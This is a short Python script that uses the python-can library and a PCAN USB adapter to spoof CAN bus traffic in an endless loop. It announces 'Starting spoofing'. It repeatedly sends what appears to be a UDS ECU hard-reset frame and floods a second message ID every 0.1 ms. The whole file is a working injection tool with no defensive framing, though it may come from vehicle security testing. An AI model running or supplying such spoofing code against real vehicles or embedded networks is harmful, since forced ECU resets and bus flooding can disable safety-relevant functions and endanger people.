import time
import can

can_interface = "PCAN_USBBUS1"
bus = can.interface.Bus(channel=can_interface, bustype='pcan')

messages = [
    {"id": 1570, "data": [0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00], "interval": 0.03},  # 30 ms
    {"id": 962, "data": [0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], "interval": 0.0001},  # 0.1 ms
]

try:
    print("Starting spoofing...")
    while True:
        for msg in messages:
            message = can.Message(
                arbitration_id=msg["id"],
                data=msg["data"],
                is_extended_id=False
            )
            try:
                bus.send(message)
                print(f"Send: ID={message.arbitration_id}, Data={message.data}")
            except can.CanError as e:
                print(f"Error: {e}")
            
            time.sleep(msg["interval"])
except KeyboardInterrupt:
    print("stop executing...")
